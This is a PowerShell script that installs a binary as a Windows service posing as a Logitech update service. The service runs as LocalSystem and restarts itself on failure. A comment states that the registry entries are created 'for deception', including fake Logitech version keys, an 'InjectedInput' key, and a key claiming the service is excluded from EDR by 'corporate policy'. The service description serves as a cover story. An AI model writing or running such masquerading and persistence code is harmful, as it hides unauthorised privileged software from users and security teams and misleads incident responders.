# Logitech Update Service Deployment Script
# This script deploys the LogiOptions application as a Windows service named "LogitechUpdateService"
# Run this script as Administrator

param(
    [switch]$Install,
    [switch]$Uninstall,
    [switch]$Start,
    [switch]$Stop,
    [switch]$Status,
    [string]$ServiceName = "LogitechUpdateService",
    [string]$DisplayName = "Logitech Update Service (On-Demand)",
    [string]$Description = "Provides UI automation test support and peripheral synchronization.",
    [string]$InstallPath = "C:\Program Files\Logitech\LogiOptions",
    [string]$ExecutableName = "LogiOptions.exe"
)

# Function to check if running as Administrator
function Test-Administrator {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Function to create service installation
function Install-Service {
    Write-Host "Installing $ServiceName service..." -ForegroundColor Cyan
    
    # Check if executable exists
    $exePath = Join-Path $InstallPath $ExecutableName
    if (-not (Test-Path $exePath)) {
        Write-Host "Error: Executable not found at $exePath" -ForegroundColor Red
        Write-Host "Please build the project first or specify correct path." -ForegroundColor Yellow
        return $false
    }
    
    # Create installation directory if it doesn't exist
    if (-not (Test-Path $InstallPath)) {
        Write-Host "Creating installation directory: $InstallPath" -ForegroundColor Yellow
        New-Item -ItemType Directory -Path $InstallPath -Force | Out-Null
    }
    
    # Copy files (assuming we're running from project directory)
    $projectDir = $PSScriptRoot
    Write-Host "Copying files from $projectDir to $InstallPath..." -ForegroundColor Yellow
    
    # Copy main executable
    Copy-Item "$projectDir\bin\Release\net10.0-windows\LogiOptions.exe" $exePath -Force
    
    # Copy supporting files
    $supportFiles = @(
        "appsettings.json",
        "test_scenario.json",
        "whitelist.sig",
        "LogiOptions.exe.sig",
        "LogiOptions.chm"
    )
    
    foreach ($file in $supportFiles) {
        $source = Join-Path $projectDir $file
        if (Test-Path $source) {
            Copy-Item $source $InstallPath -Force
            Write-Host "  Copied: $file" -ForegroundColor Gray
        }
    }
    
    # Create necessary registry entries for deception
    Write-Host "Creating registry artifacts..." -ForegroundColor Yellow
    $regPath = "HKLM:\SOFTWARE\Logitech\Options"
    New-Item -Path $regPath -Force | Out-Null
    New-ItemProperty -Path $regPath -Name "Version" -Value "10.5.2" -PropertyType String -Force | Out-Null
    New-ItemProperty -Path $regPath -Name "InstallPath" -Value $InstallPath -PropertyType String -Force | Out-Null
    New-ItemProperty -Path $regPath -Name "AnalyticsEnabled" -Value 1 -PropertyType DWord -Force | Out-Null
    New-ItemProperty -Path $regPath -Name "UpdateCheckInterval" -Value 86400 -PropertyType DWord -Force | Out-Null
    
    # Create test scenario registry
    $testRegPath = "HKLM:\SOFTWARE\Logitech\Options\TestScenario"
    New-Item -Path $testRegPath -Force | Out-Null
    New-ItemProperty -Path $testRegPath -Name "Enabled" -Value 1 -PropertyType DWord -Force | Out-Null
    New-ItemProperty -Path $testRegPath -Name "InjectedInput" -Value "true (required for UI automation)" -PropertyType String -Force | Out-Null
    
    # Create whitelist registry
    $whitelistRegPath = "HKLM:\SOFTWARE\Logitech\Options\Whitelist"
    New-Item -Path $whitelistRegPath -Force | Out-Null
    New-ItemProperty -Path $whitelistRegPath -Name "EDR" -Value "Excluded via corporate policy" -PropertyType String -Force | Out-Null
    
    # Install the service
    Write-Host "Creating Windows service: $ServiceName" -ForegroundColor Green
    
    # Check if service already exists
    $existingService = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
    if ($existingService) {
        Write-Host "Service already exists. Stopping and removing..." -ForegroundColor Yellow
        Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
        sc.exe delete $ServiceName | Out-Null
        Start-Sleep -Seconds 2
    }
    
    # Create new service
    $scResult = sc.exe create $ServiceName binPath= "`"$exePath`" --service" DisplayName= "$DisplayName" start= demand obj= "LocalSystem"
    
    if ($LASTEXITCODE -eq 0) {
        Write-Host "Service created successfully!" -ForegroundColor Green
        
        # Set service description
        sc.exe description $ServiceName "$Description"
        
        # Configure service recovery options
        sc.exe failure $ServiceName reset= 86400 actions= "restart/5000/restart/5000/restart/5000"
        
        return $true
    } else {
        Write-Host "Failed to create service. Error code: $LASTEXITCODE" -ForegroundColor Red
        Write-Host "SC output: $scResult" -ForegroundColor Red
        return $false
    }
}

# Function to uninstall service
function Uninstall-Service {
    Write-Host "Uninstalling $ServiceName service..." -ForegroundColor Cyan
    
    # Stop service if running
    $service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
    if ($service) {
        if ($service.Status -eq 'Running') {
            Write-Host "Stopping service..." -ForegroundColor Yellow
            Stop-Service -Name $ServiceName -Force
            Start-Sleep -Seconds 3
        }
        
        # Delete service
        Write-Host "Removing service..." -ForegroundColor Yellow
        sc.exe delete $ServiceName | Out-Null
        
        if ($LASTEXITCODE -eq 0) {
            Write-Host "Service removed successfully!" -ForegroundColor Green
        } else {
            Write-Host "Failed to remove service." -ForegroundColor Red
        }
    } else {
        Write-Host "Service not found." -ForegroundColor Yellow
    }
    
    # Optional: Remove installation directory
    $removeFiles = Read-Host "Remove installation directory ($InstallPath)? (y/n)"
    if ($removeFiles -eq 'y') {
        if (Test-Path $InstallPath) {
            Remove-Item -Path $InstallPath -Recurse -Force -ErrorAction SilentlyContinue
            Write-Host "Installation directory removed." -ForegroundColor Green
        }
    }
    
    # Optional: Remove registry entries
    $removeReg = Read-Host "Remove registry entries? (y/n)"
    if ($removeReg -eq 'y') {
        Remove-Item -Path "HKLM:\SOFTWARE\Logitech\Options" -Recurse -Force -ErrorAction SilentlyContinue
        Write-Host "Registry entries removed." -ForegroundColor Green
    }
}

# Function to check service status
function Get-ServiceStatus {
    $service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
    
    if (-not $service) {
        Write-Host "Service '$ServiceName' is not installed." -ForegroundColor Red
        return $false
    }
    
    Write-Host "Service Name: $($service.Name)" -ForegroundColor Cyan
    Write-Host "Display Name: $($service.DisplayName)" -ForegroundColor Cyan
    Write-Host "Status: $($service.Status)" -ForegroundColor $(if ($service.Status -eq 'Running') { 'Green' } else { 'Yellow' })
    Write-Host "Start Type: $($service.StartType)" -ForegroundColor Cyan
    
    # Get service configuration details
    $scQuery = sc.exe qc $ServiceName
    Write-Host "`nService Configuration:" -ForegroundColor Cyan
    $scQuery | ForEach-Object { Write-Host "  $_" -ForegroundColor Gray }
    
    return $true
}

# Main script execution
if (-not (Test-Administrator)) {
    Write-Host "This script requires Administrator privileges!" -ForegroundColor Red
    Write-Host "Please run PowerShell as Administrator and try again." -ForegroundColor Yellow
    exit 1
}

Write-Host "`n==========================================" -ForegroundColor Cyan
Write-Host "Logitech Update Service Deployment Tool" -ForegroundColor Cyan
Write-Host "==========================================`n" -ForegroundColor Cyan

if ($Install) {
    $success = Install-Service
    if ($success) {
        Write-Host "`nInstallation completed successfully!" -ForegroundColor Green
        Write-Host "Service will start on demand when triggered." -ForegroundColor Yellow
        Write-Host "`nTo start the service manually: .\Deploy-LogitechUpdateService.ps1 -Start" -ForegroundColor Gray
    } else {
        Write-Host "`nInstallation failed." -ForegroundColor Red
        exit 1
    }
}
elseif ($Uninstall) {
    Uninstall-Service
}
elseif ($Start) {
    Write-Host "Starting $ServiceName service..." -ForegroundColor Cyan
    Start-Service -Name $ServiceName -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    Get-Service -Name $ServiceName
}
elseif ($Stop) {
    Write-Host "Stopping $ServiceName service..." -ForegroundColor Cyan
    Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    Get-Service -Name $ServiceName
}
elseif ($Status) {
    Get-ServiceStatus
}
else {
    Write-Host "Usage: .\Deploy-LogitechUpdateService.ps1 [options]" -ForegroundColor Yellow
    Write-Host "`nOptions:" -ForegroundColor Cyan
    Write-Host "  -Install     Install the service" -ForegroundColor Gray
    Write-Host "  -Uninstall   Uninstall the service" -ForegroundColor Gray
    Write-Host "  -Start       Start the service" -ForegroundColor Gray
    Write-Host "  -Stop        Stop the service" -ForegroundColor Gray
    Write-Host "  -Status      Check service status" -ForegroundColor Gray
    Write-Host "`nExamples:" -ForegroundColor Cyan
    Write-Host "  .\Deploy-LogitechUpdateService.ps1 -Install" -ForegroundColor Gray
    Write-Host "  .\Deploy-LogitechUpdateService.ps1 -Status" -ForegroundColor Gray
    Write-Host "  .\Deploy-LogitechUpdateService.ps1 -Uninstall" -ForegroundColor Gray
}

Write-Host "`n==========================================" -ForegroundColor Cyan